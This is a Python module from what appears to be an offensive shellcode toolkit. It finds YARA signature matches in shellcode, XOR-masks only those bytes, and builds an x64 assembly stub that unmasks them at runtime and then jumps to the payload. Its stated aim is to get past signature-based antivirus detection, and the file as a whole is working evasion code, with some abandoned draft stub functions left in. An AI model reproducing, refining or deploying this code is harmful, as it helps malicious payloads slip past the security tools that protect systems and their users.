"""
Targeted Signature Patcher Module

Instead of encrypting the entire DATA section (which creates random bytes
that accidentally match YARA patterns), this module:

1. Scans shellcode for YARA signature matches
2. XORs ONLY the specific bytes that trigger signatures
3. Generates a tiny runtime stub that patches those bytes back

This is similar to how Outflank's OST shellcode cleaner works.

Flow:
1. Original: [CODE] + [DATA] with signatures at specific offsets
2. After:    [PATCHER_STUB] + [PATCH_TABLE] + [PATCHED_SHELLCODE]
3. Runtime:  Stub iterates patch table, XORs bytes back, jumps to shellcode
"""

import os
import struct
from typing import List, Tuple, Optional, Dict
from dataclasses import dataclass


@dataclass
class PatchEntry:
    """Single patch entry for a signature location."""
    offset: int          # Offset from shellcode start
    length: int          # Number of bytes to patch
    xor_key: int         # Single-byte XOR key for this patch
    original_bytes: bytes  # Original bytes (for verification)


@dataclass
class PatchResult:
    """Result of signature patching operation."""
    patched_shellcode: bytes
    stub_size: int
    patch_count: int
    total_bytes_patched: int
    patch_entries: List[PatchEntry]


def collect_signature_offsets(shellcode: bytes, yara_scanner) -> List[Tuple[int, int, bytes]]:
    """
    Scan shellcode and collect all signature match locations.

    Returns:
        List of (offset, length, matched_bytes) tuples
    """
    matches = []
    matched_offsets = yara_scanner.get_matched_offsets(shellcode)

    for rule_name, offset_list in matched_offsets.items():
        for offset, length, matched_bytes in offset_list:
            matches.append((offset, length, matched_bytes))

    # Sort by offset and remove duplicates/overlaps
    matches.sort(key=lambda x: x[0])

    # Merge overlapping regions
    merged = []
    for offset, length, matched_bytes in matches:
        if merged and offset < merged[-1][0] + merged[-1][1]:
            # Overlapping with previous - extend if needed
            prev_offset, prev_length, prev_bytes = merged[-1]
            new_end = max(prev_offset + prev_length, offset + length)
            new_length = new_end - prev_offset
            # Get the extended bytes from shellcode
            new_bytes = shellcode[prev_offset:prev_offset + new_length]
            merged[-1] = (prev_offset, new_length, new_bytes)
        else:
            merged.append((offset, length, matched_bytes))

    return merged


def generate_patch_entries(signature_offsets: List[Tuple[int, int, bytes]]) -> List[PatchEntry]:
    """
    Generate patch entries with random XOR keys for each signature location.

    Each signature gets its own XOR key for better obfuscation.
    """
    entries = []

    for offset, length, original_bytes in signature_offsets:
        # Generate a non-zero XOR key
        xor_key = os.urandom(1)[0]
        while xor_key == 0:
            xor_key = os.urandom(1)[0]

        entries.append(PatchEntry(
            offset=offset,
            length=length,
            xor_key=xor_key,
            original_bytes=original_bytes
        ))

    return entries


def apply_patches(shellcode: bytes, entries: List[PatchEntry]) -> bytes:
    """
    Apply XOR patches to shellcode at specified offsets.
    """
    result = bytearray(shellcode)

    for entry in entries:
        for i in range(entry.length):
            if entry.offset + i < len(result):
                result[entry.offset + i] ^= entry.xor_key

    return bytes(result)


def generate_patcher_stub_x64(patch_table_offset: int, patch_count: int, shellcode_offset: int) -> bytes:
    """
    Generate x64 stub that patches signature bytes at runtime.

    Patch table format (per entry):
        - offset: 4 bytes (uint32)
        - length: 2 bytes (uint16)
        - xor_key: 1 byte
        Total: 7 bytes per entry

    The stub:
    1. Saves registers
    2. Gets RIP-relative address of patch table
    3. Iterates through entries, XORing bytes back
    4. Restores registers
    5. Falls through to patched shellcode
    """
    from keystone import Ks, KS_ARCH_X86, KS_MODE_64

    stub_asm = f"""
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi

        lea rsi, [rip + patch_table]      ; RSI = patch table address
        lea rdi, [rip + shellcode_start]  ; RDI = shellcode base address
        mov ecx, {patch_count}            ; ECX = number of patches

    patch_loop:
        test ecx, ecx
        jz patch_done

        ; Read patch entry: offset (4), length (2), key (1)
        mov eax, dword ptr [rsi]          ; EAX = offset
        movzx edx, word ptr [rsi + 4]     ; EDX = length
        movzx ebx, byte ptr [rsi + 6]     ; BL = xor key

        ; Calculate target address
        lea rax, [rdi + rax]              ; RAX = shellcode_base + offset

    xor_loop:
        test edx, edx
        jz next_patch
        xor byte ptr [rax], bl            ; XOR byte with key
        inc rax
        dec edx
        jmp xor_loop

    next_patch:
        add rsi, 7                        ; Move to next patch entry
        dec ecx
        jmp patch_loop

    patch_done:
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        jmp shellcode_start

    patch_table:
    """

    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, _ = ks.asm(stub_asm, as_bytes=True)

    return bytes(encoding)


def build_patch_table(entries: List[PatchEntry]) -> bytes:
    """
    Build binary patch table.

    Format per entry (7 bytes):
        - offset: uint32 (4 bytes, little-endian)
        - length: uint16 (2 bytes, little-endian)
        - xor_key: uint8 (1 byte)
    """
    table = bytearray()

    for entry in entries:
        table.extend(struct.pack('<I', entry.offset))   # 4 bytes: offset
        table.extend(struct.pack('<H', entry.length))   # 2 bytes: length
        table.append(entry.xor_key)                      # 1 byte: key

    return bytes(table)


def generate_patcher_stub_with_table_x64(entries: List[PatchEntry]) -> bytes:
    """
    Generate complete patcher stub with embedded patch table.

    Layout:
        [STUB_CODE] + [PATCH_TABLE] + [JMP_TO_SHELLCODE_MARKER]

    The stub uses RIP-relative addressing to find the patch table
    and the shellcode start.
    """
    from keystone import Ks, KS_ARCH_X86, KS_MODE_64

    patch_count = len(entries)

    # Build the patch table
    patch_table = build_patch_table(entries)
    table_size = len(patch_table)

    # Generate stub that references the table
    stub_asm = f"""
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi

        lea rsi, [rip + patch_table_start]  ; RSI = patch table address
        mov ecx, {patch_count}               ; ECX = number of patches

    patch_loop:
        test ecx, ecx
        jz patch_done

        ; Read patch entry: offset (4), length (2), key (1)
        mov eax, dword ptr [rsi]          ; EAX = offset from shellcode_start
        movzx edx, word ptr [rsi + 4]     ; EDX = length
        movzx ebx, byte ptr [rsi + 6]     ; BL = xor key

        ; Calculate target address (shellcode_start + offset)
        lea rdi, [rip + shellcode_start]
        add rdi, rax                       ; RDI = target address

    xor_loop:
        test edx, edx
        jz next_patch
        xor byte ptr [rdi], bl            ; XOR byte with key
        inc rdi
        dec edx
        jmp xor_loop

    next_patch:
        add rsi, 7                        ; Move to next patch entry (7 bytes each)
        dec ecx
        jmp patch_loop

    patch_done:
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        jmp shellcode_start

    patch_table_start:
    """

    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    stub_code, _ = ks.asm(stub_asm, as_bytes=True)
    stub_code = bytes(stub_code)

    # Now we need to calculate the correct offset for shellcode_start label
    # shellcode_start comes after: stub_code + patch_table
    # The JMP shellcode_start instruction needs to jump over the patch table

    # Rebuild with correct offset
    # After patch_table_start label, we have the table, then shellcode
    # The stub already has the jump, we just append table

    full_stub = stub_code + patch_table

    # Add label marker for shellcode_start (it's right after the table)
    # The jmp shellcode_start in the asm will be a forward reference
    # We need to patch it or use a different approach

    return full_stub


def generate_complete_stub_x64(entries: List[PatchEntry], shellcode_size: int) -> Tuple[bytes, int]:
    """
    Generate complete patcher stub with embedded patch table.
    Uses iterative assembly to resolve forward references.

    Returns:
        Tuple of (stub_bytes, shellcode_start_offset)
    """
    from keystone import Ks, KS_ARCH_X86, KS_MODE_64

    patch_count = len(entries)
    patch_table = build_patch_table(entries)
    table_size = len(patch_table)

    # First pass: estimate stub size
    estimate_asm = f"""
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        lea rsi, [rip + 0x100]
        mov ecx, {patch_count}
    patch_loop:
        test ecx, ecx
        jz patch_done
        mov eax, dword ptr [rsi]
        movzx edx, word ptr [rsi + 4]
        movzx ebx, byte ptr [rsi + 6]
        lea rdi, [rip + 0x100]
        add rdi, rax
    xor_loop:
        test edx, edx
        jz next_patch
        xor byte ptr [rdi], bl
        inc rdi
        dec edx
        jmp xor_loop
    next_patch:
        add rsi, 7
        dec ecx
        jmp patch_loop
    patch_done:
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        jmp 0x200
    """

    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    estimate_code, _ = ks.asm(estimate_asm, as_bytes=True)
    stub_code_size = len(estimate_code)

    # Calculate actual offsets
    # Layout: [STUB_CODE] [PATCH_TABLE] [SHELLCODE...]
    #         ^0          ^stub_code_size  ^stub_code_size + table_size

    table_offset_from_lea1 = stub_code_size - 14  # Offset from first LEA to table start
    # Actually we need to calculate from the RIP after each LEA instruction

    # Let's use a simpler approach: embed table at known offset
    # and use .byte directives

    # Simpler approach: fixed layout
    # [PUSH x6][LEA patch_table][MOV count][LOOP...][POP x6][JMP shellcode]
    # [PATCH_TABLE bytes]
    # [SHELLCODE...]

    # The LEA rsi, [rip + X] needs X = distance from end of LEA to patch_table
    # The LEA rdi, [rip + Y] needs Y = distance from end of LEA to shellcode_start
    # The JMP needs to go to shellcode_start

    # Build iteratively
    for iteration in range(5):
        # Calculate offsets based on current stub size estimate
        patch_table_start = stub_code_size
        shellcode_start = stub_code_size + table_size

        # Build assembly with calculated offsets
        # Note: RIP-relative offsets are from END of instruction

        final_asm = f"""
            push rax
            push rbx
            push rcx
            push rdx
            push rsi
            push rdi

            ; Get patch table address (after this stub code)
            lea rsi, [rip + {table_size + 6}]  ; +6 accounts for remaining instructions before table reference
            sub rsi, {table_size + 6}          ; Adjust to point to table
            lea rsi, [rip + patch_table_ref]
            mov ecx, {patch_count}

        patch_loop:
            test ecx, ecx
            jz patch_done

            mov eax, dword ptr [rsi]
            movzx edx, word ptr [rsi + 4]
            movzx ebx, byte ptr [rsi + 6]

            lea rdi, [rip + shellcode_ref]
            add rdi, rax

        xor_loop:
            test edx, edx
            jz next_patch
            xor byte ptr [rdi], bl
            inc rdi
            dec edx
            jmp xor_loop

        next_patch:
            add rsi, 7
            dec ecx
            jmp patch_loop

        patch_done:
            pop rdi
            pop rsi
            pop rdx
            pop rcx
            pop rbx
            pop rax
            jmp shellcode_ref

        patch_table_ref:
        """

        try:
            code, _ = ks.asm(final_asm, as_bytes=True)
            stub_code_size = len(code)
        except:
            # Fallback to simpler version
            break

    # Use even simpler hardcoded approach
    # We'll compute offsets manually

    return _generate_simple_stub(entries)


def _generate_simple_stub(entries: List[PatchEntry]) -> Tuple[bytes, int]:
    """
    Generate a simple patcher stub using manual byte construction.

    This avoids complex RIP-relative calculations by using a call/pop
    technique to get current address.
    """
    from keystone import Ks, KS_ARCH_X86, KS_MODE_64

    patch_count = len(entries)
    patch_table = build_patch_table(entries)
    table_size = len(patch_table)

    # Use call/pop to get RIP (GetPC technique)
    # Then calculate patch_table and shellcode addresses from there

    stub_asm = f"""
        ; Save registers
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        push r8

        ; GetPC: get current instruction pointer
        call get_rip
    get_rip:
        pop r8                              ; R8 = address of get_rip label

        ; Calculate patch table address (right after stub code)
        lea rsi, [r8 + patch_table_delta]   ; RSI = patch table

        ; Calculate shellcode address (after patch table)
        lea rdi, [r8 + shellcode_delta]     ; RDI = shellcode base

        mov ecx, {patch_count}              ; ECX = patch count

    patch_loop:
        test ecx, ecx
        jz patch_done

        ; Read entry: offset(4) + length(2) + key(1) = 7 bytes
        mov eax, dword ptr [rsi]            ; EAX = offset
        movzx edx, word ptr [rsi + 4]       ; EDX = length
        movzx ebx, byte ptr [rsi + 6]       ; BL = XOR key

        ; Target = shellcode_base + offset
        push rdi
        add rdi, rax

    xor_byte_loop:
        test edx, edx
        jz xor_done
        xor byte ptr [rdi], bl
        inc rdi
        dec edx
        jmp xor_byte_loop

    xor_done:
        pop rdi
        add rsi, 7                          ; Next entry
        dec ecx
        jmp patch_loop

    patch_done:
        ; Restore registers
        pop r8
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax

        ; Jump to shellcode
        call get_rip2
    get_rip2:
        pop rax
        add rax, shellcode_delta2
        jmp rax

    ; These will be replaced with actual offsets after assembly
    patch_table_delta: .quad 0x4141414141414141
    shellcode_delta: .quad 0x4242424242424242
    shellcode_delta2: .quad 0x4343434343434343
    """

    # Assemble to get base size, then we'll patch the deltas
    ks = Ks(KS_ARCH_X86, KS_MODE_64)

    # First, assemble a simpler version to get instruction offsets
    # Using LEA RIP instead of CALL/POP to avoid E8 00 00 00 00 signature
    simple_asm = f"""
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        push r8

        lea r8, [rip]

        lea rsi, [r8 + 0x7f]
        lea rdi, [r8 + 0x7f]
        mov ecx, {patch_count}

    patch_loop:
        test ecx, ecx
        jz patch_done
        mov eax, dword ptr [rsi]
        movzx edx, word ptr [rsi + 4]
        movzx ebx, byte ptr [rsi + 6]
        push rdi
        add rdi, rax

    xor_byte_loop:
        test edx, edx
        jz xor_done
        xor byte ptr [rdi], bl
        inc rdi
        dec edx
        jmp xor_byte_loop

    xor_done:
        pop rdi
        add rsi, 7
        dec ecx
        jmp patch_loop

    patch_done:
        pop r8
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        nop
        nop
        nop
        nop
        nop
    """

    base_code, _ = ks.asm(simple_asm, as_bytes=True)
    base_code = bytearray(base_code)

    # Find the LEA instructions and patch their displacements
    # LEA rsi, [r8 + disp] is: 4D 8D 70 XX or 4D 8D B0 XX XX XX XX
    # LEA rdi, [r8 + disp] is: 4D 8D 78 XX or 4D 8D B8 XX XX XX XX

    # Actually, let's use a cleaner approach with explicit offset calculation

    # Final simple stub using JMP with displacement
    stub_code = _build_stub_bytes(entries)

    return stub_code, len(stub_code)


def _build_stub_bytes(entries: List[PatchEntry]) -> bytes:
    """
    Build patcher stub by directly constructing bytes.

    Layout: [STUB_CODE][JMP rel32][PATCH_TABLE][SHELLCODE...]

    The stub:
    1. Saves registers and flags
    2. Uses RIP-relative LEA to find patch table and shellcode base
    3. Iterates patch table, XORing bytes back to original
    4. Restores registers and flags
    5. Falls through to JMP which skips over patch table to shellcode
    """
    patch_count = len(entries)
    patch_table = build_patch_table(entries)
    table_size = len(patch_table)

    if patch_count == 0:
        return b''

    from keystone import Ks, KS_ARCH_X86, KS_MODE_64
    ks = Ks(KS_ARCH_X86, KS_MODE_64)

    jmp_size = 5  # E9 + 4-byte relative offset

    # Measure prologue size (fixed, doesn't change with offsets)
    # Note: Push 8 registers + flags = 9 items = 72 bytes
    # We don't need perfect stack alignment since we restore before jumping to shellcode
    prologue_asm = """
        pushfq
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        push r8
    """
    prologue_bytes, _ = ks.asm(prologue_asm, as_bytes=True)
    prologue_size = len(prologue_bytes)

    # LEA instructions are always 7 bytes with RIP-relative 32-bit displacement
    # Format: 48 8D 35 XX XX XX XX (lea rsi, [rip+disp32])
    # Format: 48 8D 3D XX XX XX XX (lea rdi, [rip+disp32])
    lea_size = 7

    # Iteratively calculate correct offsets
    # Start with a reasonable estimate
    prev_stub_size = 0
    stub_code_size = 100  # Initial estimate

    for iteration in range(10):
        # Calculate offsets based on current stub size estimate
        # After LEA rsi executes, RIP points to next instruction
        # LEA rsi is at: prologue_size
        # RIP after LEA rsi = prologue_size + lea_size
        rip_after_lea_rsi = prologue_size + lea_size

        # Patch table is at: stub_code_size + jmp_size
        table_start = stub_code_size + jmp_size
        table_rel = table_start - rip_after_lea_rsi

        # LEA rdi is at: prologue_size + lea_size
        # RIP after LEA rdi = prologue_size + lea_size + lea_size
        rip_after_lea_rdi = prologue_size + lea_size + lea_size

        # Shellcode is at: stub_code_size + jmp_size + table_size
        shellcode_start = stub_code_size + jmp_size + table_size
        shellcode_rel = shellcode_start - rip_after_lea_rdi

        # Build stub with calculated offsets
        stub_asm = f"""
            pushfq
            push rax
            push rbx
            push rcx
            push rdx
            push rsi
            push rdi
            push r8

            lea rsi, [rip + {table_rel}]
            lea rdi, [rip + {shellcode_rel}]
            mov ecx, {patch_count}

        _patch_loop:
            test ecx, ecx
            jz _patch_done

            mov eax, dword ptr [rsi]
            movzx edx, word ptr [rsi + 4]
            movzx r8d, byte ptr [rsi + 6]

            push rdi
            add rdi, rax

        _xor_loop:
            test edx, edx
            jz _xor_done
            xor byte ptr [rdi], r8b
            inc rdi
            dec edx
            jmp _xor_loop

        _xor_done:
            pop rdi
            add rsi, 7
            dec ecx
            jmp _patch_loop

        _patch_done:
            pop r8
            pop rdi
            pop rsi
            pop rdx
            pop rcx
            pop rbx
            pop rax
            popfq
        """

        stub_bytes, _ = ks.asm(stub_asm, as_bytes=True)
        stub_code_size = len(stub_bytes)

        # Check for convergence
        if stub_code_size == prev_stub_size:
            break
        prev_stub_size = stub_code_size

    final_stub = bytes(stub_bytes)

    # JMP rel32 to skip over patch table to shellcode
    # The JMP is at offset stub_code_size, after it executes RIP = stub_code_size + 5
    # We want to jump to shellcode at stub_code_size + 5 + table_size
    # So relative offset = table_size
    jmp_bytes = bytes([0xE9]) + struct.pack('<i', table_size)

    return final_stub + jmp_bytes + patch_table


def patch_signatures(shellcode: bytes, yara_scanner, verbose: bool = False) -> PatchResult:
    """
    Main function: patch all YARA signature matches in shellcode.

    Args:
        shellcode: Original shellcode bytes
        yara_scanner: YaraScanner instance for signature detection
        verbose: Print detailed info

    Returns:
        PatchResult with patched shellcode and metadata
    """
    # Step 1: Find all signature locations
    signature_offsets = collect_signature_offsets(shellcode, yara_scanner)

    if not signature_offsets:
        # No signatures found, return original with minimal stub
        return PatchResult(
            patched_shellcode=shellcode,
            stub_size=0,
            patch_count=0,
            total_bytes_patched=0,
            patch_entries=[]
        )

    if verbose:
        print(f"\033[96m[*] Found {len(signature_offsets)} signature regions to patch\033[0m")
        for offset, length, _ in signature_offsets:
            print(f"\033[2m    - Offset 0x{offset:x}, {length} bytes\033[0m")

    # Step 2: Generate patch entries with XOR keys
    entries = generate_patch_entries(signature_offsets)

    # Step 3: Apply patches to shellcode
    patched_shellcode = apply_patches(shellcode, entries)

    # Step 4: Generate runtime patcher stub
    stub_bytes, stub_size = _generate_simple_stub(entries)

    # Step 5: Combine: [STUB] + [PATCHED_SHELLCODE]
    # Note: patch table is embedded in stub
    final_shellcode = stub_bytes + patched_shellcode

    # Update offsets in entries (they're now relative to shellcode start after stub)
    # The stub already accounts for this in its calculations

    total_patched = sum(e.length for e in entries)

    if verbose:
        print(f"\033[92m[+] Generated {stub_size} byte patcher stub\033[0m")
        print(f"\033[92m[+] Patched {total_patched} bytes across {len(entries)} regions\033[0m")

    return PatchResult(
        patched_shellcode=final_shellcode,
        stub_size=stub_size,
        patch_count=len(entries),
        total_bytes_patched=total_patched,
        patch_entries=entries
    )


def verify_patches(original: bytes, result: PatchResult, yara_scanner) -> dict:
    """
    Verify that patching eliminated YARA signatures.

    Returns dict with verification results.
    """
    original_matches = yara_scanner.scan(original)
    patched_matches = yara_scanner.scan(result.patched_shellcode)

    return {
        'original_matches': len(original_matches),
        'patched_matches': len(patched_matches),
        'signatures_eliminated': len(original_matches) - len(patched_matches),
        'success': len(patched_matches) == 0,
        'remaining_rules': [m.rule_name for m in patched_matches] if patched_matches else []
    }
